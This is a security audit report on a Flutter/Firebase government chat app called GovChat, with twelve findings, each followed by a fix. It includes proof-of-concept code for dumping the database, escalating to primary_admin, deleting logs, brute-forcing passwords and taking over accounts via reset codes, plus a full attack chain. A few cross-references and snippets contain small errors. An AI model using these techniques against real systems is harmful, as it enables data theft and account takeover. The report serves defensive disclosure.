# GovChat — Full Security Audit Report

**Classification:** Confidential  
**Platform:** Flutter + Firebase (Android / iOS)  
**Audit Type:** Full codebase security review + penetration-testing simulation  
**Date:** 2026-05-12  
**Auditor:** Senior Application Security Engineer  
**Branch audited:** `develop`

---

## Executive Summary

GovChat contains **critical, trivially exploitable vulnerabilities** across every security layer. The most severe issues are:

1. **Firestore rules allow unauthenticated read/write to every collection** — the entire database is exposed.
2. **All Cloud Functions are publicly callable with no authentication** — admin creation, password reset, and email sending are fully open to the internet.
3. **Password reset codes are stored in plaintext in the open Firestore database** — any unauthenticated attacker can read any user's reset code and take over their account.
4. **Temporary admin passwords are 8 decimal digits** — brute-forceable in under a second with a dictionary of 100 million entries.

These four issues alone are sufficient for complete platform compromise. **GovChat must not be deployed to production in its current state.**

---

## Risk Summary

| ID | Title | Severity | Confidence |
|----|-------|----------|------------|
| F-01 | Open Firestore Security Rules | **Critical** | 10/10 |
| F-02 | All Cloud Functions Unauthenticated | **Critical** | 10/10 |
| F-03 | Password Reset Code — No UID Ownership Check | **Critical** | 10/10 |
| F-04 | Password Reset Codes Stored in Plaintext | **Critical** | 10/10 |
| F-05 | Weak Temporary Admin Password (8 digits) | **Critical** | 10/10 |
| F-06 | Client Can Write Sensitive Firestore Fields | **Critical** | 10/10 |
| F-07 | Soft-Deleted Messages Permanently Readable | **High** | 9/10 |
| F-08 | User Enumeration via Cloud Function Errors | **High** | 10/10 |
| F-09 | Missing Reauthentication Before Password Change | **High** | 8/10 |
| F-10 | No Ownership Validation on Private Chat Creation | **High** | 8/10 |
| F-11 | Primary Admin Bootstrap Privilege Escalation | **High** | 8/10 |
| F-12 | Debug Logs Leak Sensitive User Data | **Medium** | 9/10 |

---

## Detailed Findings

---

### F-01 — Open Firestore Security Rules

| | |
|---|---|
| **Severity** | Critical |
| **Confidence** | 10/10 |
| **File** | `firestore.rules` |
| **Area** | Firebase / Firestore |

**Description**

The Firestore security rules grant unconditional read and write access to every collection for every request — authenticated or not:

```js
// firestore.rules
allow read, write: if true;   // organizations
allow read, write: if true;   // users
allow read, write: if true;   // mail
allow read, write: if true;   // (wildcard catch-all)
```

There are zero authentication checks, zero role checks, and zero ownership checks anywhere in the rules file.

**Exploitation Scenario**

An attacker with a Firebase project ID (visible in `google-services.json` which ships inside the APK) can use the Firebase REST API or any Firestore client SDK from their laptop:

```js
// Attacker running in Node.js — no account required
const db = initializeApp({ projectId: 'govchat-prod' }).firestore();

// 1. Read every user record (uid, email, role, organizationId, e2eePublicKey)
const users = await db.collection('users').get();

// 2. Read every message across all organizations
const msgs = await db.collectionGroup('messages').get();

// 3. Escalate own user to primary_admin
await db.collection('users').doc('attacker-uid').update({ role: 'primary_admin' });

// 4. Delete all audit logs
const logs = await db.collection('logs').get();
logs.forEach(doc => doc.ref.delete());
```

**Business Impact**

- Complete data breach of all users, messages, organizations, employees, and logs.
- Any attacker can escalate to `primary_admin` by writing to their own user document.
- Audit trail can be completely wiped.
- All E2EE public keys are readable, enabling targeted key-substitution attacks.

**Recommended Fix**

Replace with deny-by-default rules. Below is a minimal starting template:

```js
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Deny everything by default
    match /{document=**} {
      allow read, write: if false;
    }

    // Users: only the owner can read their own doc; no client writes to role/status
    match /users/{uid} {
      allow read: if request.auth != null && request.auth.uid == uid;
      allow write: if false; // All writes via Cloud Functions only
    }

    // Employees: readable by same-org authenticated users
    match /employees/{uid} {
      allow read: if request.auth != null
        && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.organizationId
           == resource.data.organizationId;
      allow write: if false;
    }

    // Messages: same-org authenticated users only; no isDeleted manipulation
    match /organizations/{orgId}/departments/{deptId}/messages/{msgId} {
      allow read: if request.auth != null
        && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.organizationId == orgId;
      allow create: if request.auth != null
        && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.organizationId == orgId
        && request.resource.data.isDeleted == false
        && request.resource.data.senderUid == request.auth.uid;
      allow update: if request.auth != null
        && resource.data.senderUid == request.auth.uid; // owner only
      allow delete: if false;
    }
  }
}
```

---

### F-02 — All Cloud Functions Publicly Callable Without Authentication

| | |
|---|---|
| **Severity** | Critical |
| **Confidence** | 10/10 |
| **File** | `functions/index.js` — lines 37–40, 237–240, 376–380, 565–569, 677–679 |
| **Area** | Cloud Functions / Backend |

**Description**

Every exported Cloud Function is configured with `enforceAppCheck: false` and `invoker: "public"`. None perform any `request.auth` check. The five affected functions are:

| Function | Risk |
|---|---|
| `createAdminWithCode` | Creates admin users + organizations |
| `notifyAdminNewRequest` | Sends notification emails |
| `createEmployeeRequest` | Creates employee access requests |
| `sendPasswordResetCode` | Generates and emails a 6-digit code |
| `verifyPasswordResetCode` | Validates the code and resets password |

**Exploitation Scenario**

```js
// From an anonymous browser console — no account, no SDK
const fn = httpsCallable(functions, 'createAdminWithCode');

// Create unlimited admin accounts in any organization
await fn({ email: 'attacker@evil.com', organizationName: 'Evil Corp', city: 'X' });

// Spam any email with reset codes
await httpsCallable(functions, 'sendPasswordResetCode')({ uid: 'victim-uid', email: 'victim@org.gov' });
```

**Business Impact**

- Attacker can mass-create admin accounts.
- Password reset abuse (see F-03).
- Email spam to any user by calling notification functions.
- No identity for audit logging — all function calls appear anonymous.

**Recommended Fix**

Add an authentication guard at the top of every sensitive function:

```js
// In every callable function handler:
if (!request.auth) {
  throw new HttpsError('unauthenticated', 'Authentication required.');
}

// For admin-only operations:
const callerDoc = await admin.firestore().collection('users').doc(request.auth.uid).get();
if (!callerDoc.exists || callerDoc.data().role !== 'primary_admin') {
  throw new HttpsError('permission-denied', 'Insufficient role.');
}
```

Remove `invoker: "public"` and restrict invocation to authenticated Firebase users by setting `invoker: "private"` and granting IAM roles per function.

---

### F-03 — Password Reset: No UID Ownership Validation

| | |
|---|---|
| **Severity** | Critical |
| **Confidence** | 10/10 |
| **File** | `functions/index.js` — lines 564–739 |
| **Area** | Authentication / Cloud Functions |

**Description**

`sendPasswordResetCode` and `verifyPasswordResetCode` both accept a `uid` parameter from the request body without validating that `request.auth.uid` matches the provided UID. Since both functions are also unauthenticated (F-02), an attacker can:

1. Supply any victim's UID to `sendPasswordResetCode` — triggering a reset code to be written to Firestore and (optionally) emailed to the victim.
2. Read the plaintext code directly from Firestore (F-04).
3. Supply the stolen code to `verifyPasswordResetCode` to reset the victim's Firebase Auth password.

```js
// functions/index.js ~line 589
const { uid, email } = request.data;  // ← uid is attacker-controlled; never validated
```

**Exploitation Scenario**

Complete account takeover in 3 unauthenticated API calls:

```bash
# Step 1: trigger reset for any UID
POST /sendPasswordResetCode  { uid: "victim_uid", email: "victim@org.gov" }

# Step 2: read plaintext code from open Firestore (see F-04)
GET /passwordResetCodes/victim_uid  → { code: "482910" }

# Step 3: reset password
POST /verifyPasswordResetCode  { uid: "victim_uid", code: "482910", newPassword: "attacker123" }
```

**Business Impact**

Full account takeover of any user (employee, admin, or primary_admin) without any prior credentials.

**Recommended Fix**

```js
// In sendPasswordResetCode:
if (!request.auth || request.auth.uid !== request.data.uid) {
  throw new HttpsError('permission-denied', 'UID mismatch.');
}
```

For employee password reset (where the user may not be authenticated), consider sending the code only via email and verifying the code through a token tied to the email address rather than a guessable UID.

---

### F-04 — Password Reset Codes Stored in Plaintext in Open Firestore

| | |
|---|---|
| **Severity** | Critical |
| **Confidence** | 10/10 |
| **File** | `functions/index.js` — line ~602; `firestore.rules` |
| **Area** | Authentication / Firebase |

**Description**

The 6-digit reset code is written to Firestore in plaintext:

```js
// functions/index.js
await admin.firestore().collection('passwordResetCodes').doc(uid).set({
  code: code,        // ← plaintext, e.g. "482910"
  createdAt: admin.firestore.FieldValue.serverTimestamp(),
});
```

Combined with the fully open Firestore rules (F-01), any unauthenticated attacker can read any user's reset code directly from the `passwordResetCodes` collection without triggering or guessing anything.

**Exploitation Scenario**

```js
// No auth needed
const snap = await db.collection('passwordResetCodes').doc('victim_uid').get();
console.log(snap.data().code); // → "482910"
// → proceed to F-03 Step 3
```

**Business Impact**

Makes account takeover (F-03) instantaneous — no guessing required.

**Recommended Fix**

1. Hash codes with bcrypt before storage: `const hashed = await bcrypt.hash(code, 12);`
2. Verify using `bcrypt.compare()` in `verifyPasswordResetCode`. (Note: the 10-minute TTL and single-use deletion are already implemented — keep them.)
3. Restrict Firestore access to the `passwordResetCodes` collection to Cloud Functions only (`allow read, write: if false` in client security rules).

---

### F-05 — Weak Temporary Admin Password (8 Decimal Digits)

| | |
|---|---|
| **Severity** | Critical |
| **Confidence** | 10/10 |
| **File** | `functions/index.js` — lines 25–31 |
| **Area** | Authentication / Cloud Functions |

**Description**

The temporary password generated for new admin accounts contains only decimal digits `[0–9]` and is exactly 8 characters long:

```js
function generateTempPassword() {
  let pwd = "";
  for (let i = 0; i < 8; i++) {
    pwd += Math.floor(Math.random() * 10).toString();  // 0–9 only
  }
  return pwd;
}
// Possible passwords: "00000000" through "99999999" = 10^8 = 100,000,000
```

This gives ~26.6 bits of entropy — far below the NIST SP 800-63B minimum of 64 bits for machine-generated passwords. Firebase Auth has no enforced lockout on incorrect password attempts with the Admin SDK, and since the attacker already knows the account email (it was provided during creation), a targeted attack takes seconds.

**Exploitation Scenario**

```python
import itertools, firebase_admin
from firebase_admin import auth

# Attacker knows target admin email from enumeration (F-09)
for pwd in (str(i).zfill(8) for i in range(100_000_000)):
    try:
        # Firebase sign-in endpoint (no lockout with rapid REST calls)
        r = requests.post(SIGN_IN_URL, json={"email": target, "password": pwd})
        if r.status_code == 200:
            print(f"Password found: {pwd}")
            break
    except: pass
```

**Business Impact**

Every admin account created via `createAdminWithCode` is immediately vulnerable to offline or online brute-force. An attacker who enumerates the admin's email can gain full admin access within seconds.

**Recommended Fix**

```js
const crypto = require('crypto');

function generateTempPassword() {
  // 20 chars from a 72-char alphabet → ~122 bits of entropy
  const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*';
  return Array.from(crypto.randomBytes(20))
    .map(b => alphabet[b % alphabet.length])
    .join('');
}
```

---

### F-06 — Client Can Write Sensitive Firestore Fields (role, status, organizationId)

| | |
|---|---|
| **Severity** | Critical |
| **Confidence** | 10/10 |
| **File** | `firestore.rules` |
| **Area** | Authorization / Firebase |

**Description**

Because Firestore rules are fully open (F-01), there are no field-level write restrictions. Any authenticated (or unauthenticated) client can write any field on any document, including authorization-critical fields:

- `users/{uid}.role` — controls which UI tree and Cloud Functions the user can access
- `users/{uid}.status` — controls whether account is active or suspended
- `users/{uid}.organizationId` — controls multi-tenant data scoping
- `users/{uid}.mustChangePassword` — can clear forced password rotation
- `employees/{uid}.organizationId` — controls chat and employee scoping

**Exploitation Scenario**

```js
// Employee escalates themselves to primary_admin
await db.collection('users').doc(myUid).update({
  role: 'primary_admin',
  organizationId: '',
  mustChangePassword: false,
});
// Next app restart → LoginController routes to MainScreen (primary_admin UI)
```

**Business Impact**

Instant privilege escalation for any user in the system.

**Recommended Fix**

Implement field-level rules that prevent clients from ever writing `role`, `status`, or `organizationId`. All mutations to these fields must go through Cloud Functions that validate caller permissions before writing.

---

### F-07 — Soft-Deleted Messages Permanently Readable via Direct Query

| | |
|---|---|
| **Severity** | High |
| **Confidence** | 9/10 |
| **File** | `lib/roles/employee/features/chat/controller/chat_controller.dart`; `firestore.rules` |
| **Area** | Chat / Firebase |

**Description**

Message deletion is implemented as a soft-delete: the message document remains in Firestore with `isDeleted: true`. The app-level stream filters out deleted messages client-side, but the underlying Firestore documents are never removed. With open rules, any client can bypass the filter:

```js
// Direct query — bypasses the app's client-side isDeleted filter
const deleted = await db.collectionGroup('messages')
    .where('isDeleted', '==', true)
    .get();
// Returns every deleted message across ALL organizations
```

**Business Impact**

Users who delete messages (expecting permanent deletion) have them indefinitely accessible to any attacker. Deleted messages may contain sensitive government communications.

**Recommended Fix**

- Enforce deletion via a Cloud Function that physically deletes the document (not just flags it).
- If soft-delete is needed for admin review, restrict access to the `isDeleted: true` documents with a role check in Firestore rules, and never expose them through client-side queries alone.

---

### F-08 — User Enumeration via Cloud Function Error Responses

| | |
|---|---|
| **Severity** | High |
| **Confidence** | 10/10 |
| **File** | `functions/index.js` — lines ~95–101 |
| **Area** | Authentication / Cloud Functions |

**Description**

`createAdminWithCode` propagates Firebase Auth's `auth/email-already-exists` error code directly to the caller:

```js
// functions/index.js
if (e.code === 'auth/email-already-exists') {
  throw new HttpsError('already-exists', 'Email is already registered.');
}
```

Any unauthenticated caller can probe whether a given email address has an account by calling `createAdminWithCode` with that email and observing whether the response is `already-exists` (email registered) or `invalid-argument` / another error (email not registered).

**Exploitation Scenario**

```js
// Enumerate which emails belong to admins
const emails = ['alice@gov.org', 'bob@gov.org', ...];
for (const email of emails) {
  try {
    await createAdminFn({ email, organizationName: 'x', city: 'x' });
  } catch (e) {
    if (e.code === 'already-exists') console.log(`${email} EXISTS`);
  }
}
```

**Business Impact**

Attacker can build a map of all registered admin emails, enabling targeted phishing and brute-force attacks (F-05 and F-03).

**Recommended Fix**

Return a generic error for all creation failures that do not reveal email registration status:

```js
throw new HttpsError('internal', 'Organization creation failed. Please try again.');
```

---

### F-09 — Missing Reauthentication Before Admin Profile Password Change

| | |
|---|---|
| **Severity** | High |
| **Confidence** | 8/10 |
| **File** | `lib/roles/Admin/features/profile/controller/admin_change_password_controller.dart` |
| **Area** | Authentication |

**Description**

The admin profile password change flow calls `reauthenticateWithCredential()` using the current password entered by the user. However, for the **first-login forced password change** (`ChangePasswordScreen`), the flow in `lib/auth/controllers/change_password_controller.dart` calls `updatePassword()` directly with only the new password — no reauthentication with the old (temporary) password is performed:

```dart
// change_password_controller.dart (first-login path)
await user.updatePassword(newPasswordController.text.trim());
// ← No reauthenticate() call; relies solely on the existing session token
```

Firebase Auth tokens have a 1-hour validity window. An attacker who intercepts or hijacks a session token within that window can change the account password without knowing the current one.

**Business Impact**

Session hijacking within a 1-hour window allows full account takeover without the original credentials.

**Recommended Fix**

Always call `reauthenticateWithCredential()` with the current (temporary) password before calling `updatePassword()`, even on the first-login flow. This is a Firebase-recommended practice for all password change operations.

---

### F-10 — No Server-Side Ownership Validation on Private Chat Creation

| | |
|---|---|
| **Severity** | High |
| **Confidence** | 8/10 |
| **File** | `lib/roles/employee/features/new_chat/controller/new_chat_controller.dart` |
| **Area** | Authorization / Chat |

**Description**

When creating a private chat, the controller writes a document to Firestore containing `participants`, `participantNames`, and `organizationId` — all supplied by the client. There is no server-side rule verifying that `request.auth.uid` is one of the `participants` or that the `organizationId` matches the caller's organization:

```dart
// new_chat_controller.dart
await _firestore
    .collection('organizations')
    .doc(organizationId)          // ← attacker-controlled
    .collection('private_chats')
    .doc(chatId)
    .set({
      'participants': [currentUid, targetUid],   // ← attacker-controlled
      'participantNames': {...},
      'organizationId': organizationId,          // ← attacker-controlled
    });
```

**Exploitation Scenario**

An authenticated employee can create a private chat impersonating two other users in a different organization, then inject messages into that chat path (enabled by F-01).

**Business Impact**

Cross-organization message injection; impersonation of conversation participants.

**Recommended Fix**

Add a Firestore rule that validates:
```js
allow create: if request.auth.uid in request.resource.data.participants
  && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.organizationId
     == request.resource.data.organizationId;
```

---

### F-11 — Primary Admin Bootstrap Privilege Escalation

| | |
|---|---|
| **Severity** | High |
| **Confidence** | 8/10 |
| **File** | `lib/auth/controllers/login_controller.dart` — lines 52–75 |
| **Area** | Authentication / Authorization |

**Description**

`LoginController.login()` contains a bootstrap path: if a user authenticates successfully with Firebase Auth but has no corresponding `users/{uid}` document, they are automatically elevated to `primary_admin`:

```dart
// login_controller.dart
if (!doc.exists) {
  await FirebaseService.instance.firestore
      .collection('users')
      .doc(uid)
      .set({
        'uid': uid,
        'email': credential.user!.email,
        'role': 'primary_admin',   // ← any user with no doc becomes primary_admin
        ...
      });
  Navigator.pushAndRemoveUntil(context,
    MaterialPageRoute(builder: (_) => const MainScreen()), ...);
  return;
}
```

With the open Firestore rules (F-01) permitting client document deletion, any attacker can delete their own `users/{uid}` document, then log in again to be re-bootstrapped as `primary_admin`.

**Exploitation Scenario**

1. Attacker logs in normally as an employee.
2. Calls `db.collection('users').doc(myUid).delete()` (open rules allow it).
3. Logs in again → no document found → bootstrapped as `primary_admin`.
4. Now has full platform control.

**Business Impact**

Any existing user can escalate to the highest privilege tier in a single step.

**Recommended Fix**

Remove the auto-bootstrap path entirely. Provision the initial `primary_admin` account through a secure, out-of-band process (e.g., a one-time setup Cloud Function that checks the `users` collection is empty). Add a Firestore rule preventing deletion of `users/{uid}` by the client.

---

### F-12 — Debug Logs Leak Sensitive User Data

| | |
|---|---|
| **Severity** | Medium |
| **Confidence** | 9/10 |
| **File** | `lib/core/services/encryption/e2ee_manager.dart`; `lib/roles/employee/features/chat/controller/chat_controller.dart` |
| **Area** | Data Exposure |

**Description**

Extensive `debugPrint()` calls throughout the E2EE layer emit Firebase UIDs, conversation paths, and encryption status to the system log in debug builds — and potentially in release builds if `debugPrint` is not stripped:

```dart
// e2ee_manager.dart
debugPrint('[E2EE] X25519 key pair initialised for $uid');
debugPrint('[E2EE] getConversationKey  path=$conversationPath  private=$isPrivateChat  uid=$currentUid');
debugPrint('[E2EE] group key distributed to $recipientUid');

// chat_controller.dart
debugPrint('[E2EE] _initEncryption() start — path: $_conversationPath');
debugPrint('[E2EE][decrypt] wrong key for msg=${msg.id}: $e');
```

On Android, these are readable by any app holding `READ_LOGS` permission, or via ADB without root on debug builds. On iOS, they appear in the device console.

**Business Impact**

User UIDs, conversation paths, and message IDs are exposed in device logs, enabling targeted attacks even if other vulnerabilities are patched.

**Recommended Fix**

Wrap all `debugPrint` calls in `kDebugMode` guards:
```dart
if (kDebugMode) debugPrint('[E2EE] ...');
```
Or replace with a structured logger that is fully disabled in release builds.

---

## Attack Chain Summary

The following complete platform-compromise chain is possible with zero prior credentials:

```
1. [F-01] Read projectId from APK (google-services.json) — no account required
2. [F-08] Enumerate admin emails via createAdminWithCode 'already-exists' error
3. [F-02] Call sendPasswordResetCode(uid=victim, email=victim) — no auth required
4. [F-04+F-01] Read plaintext reset code from open passwordResetCodes/{uid} (within 10-min window)
5. [F-03] Call verifyPasswordResetCode(uid=victim, code=stolen) — reset password to attacker's choice
6. [F-11] Optionally: delete own users/{uid} doc → re-login as primary_admin
7. [F-06] Alternatively: write role='primary_admin' to users/{uid} directly via open rules
→ COMPLETE PLATFORM COMPROMISE
```

All seven steps above require zero prior credentials and can be executed from a web browser console in under 60 seconds.

---

## Remediation Priority

### Immediate (before any deployment)

| Priority | Action |
|---|---|
| P0 | Replace `firestore.rules` with deny-by-default rules with per-collection auth |
| P0 | Add `request.auth` checks to all Cloud Functions |
| P0 | Validate `request.auth.uid == request.data.uid` in password reset functions |
| P0 | Hash password reset codes with bcrypt before Firestore storage (10-min TTL already exists) |
| P0 | Replace 8-digit numeric temp password with 20-char high-entropy generator |
| P0 | Add Firestore rules blocking client writes to `role`, `status`, `organizationId` |

### Short-term (within the sprint)

| Priority | Action |
|---|---|
| P1 | Remove primary_admin bootstrap from `LoginController`; provision via a one-time secure Cloud Function |
| P1 | Add Firestore rule enforcing `senderUid == request.auth.uid` on message creation |
| P1 | Add ownership check on private chat document creation |
| P1 | Enforce `reauthenticateWithCredential()` in the first-login password change flow |
| P1 | Add Firestore rule blocking client deletion of `users/{uid}` documents |

### Medium-term

| Priority | Action |
|---|---|
| P2 | Replace `debugPrint` in E2EE layer with `kDebugMode`-guarded calls |
| P2 | Implement physical message deletion via Cloud Function (not client-side soft-delete) |
| P2 | Return generic error messages from Cloud Functions to prevent user enumeration |
| P2 | Set `invoker: "private"` on all Cloud Functions; use Firebase App Check |

---

## Disclaimer

This report was produced from static code analysis and architecture review without access to a live Firebase environment or deployed APK. Severity ratings assume the `firestore.rules` file reviewed is the one deployed to production. If rules have been updated separately from the codebase, findings F-06, F-07, F-10, and F-11 may be partially mitigated — however F-01 through F-05 are confirmed vulnerabilities in the Cloud Functions layer regardless of Firestore rules state. Two initially reported findings were removed after false-positive filtering: cross-org access via SharedPreferences (admin controllers re-read orgId from Firestore, not SharedPreferences) and missing code expiry (verifyPasswordResetCode already implements a 10-minute TTL and single-use deletion).
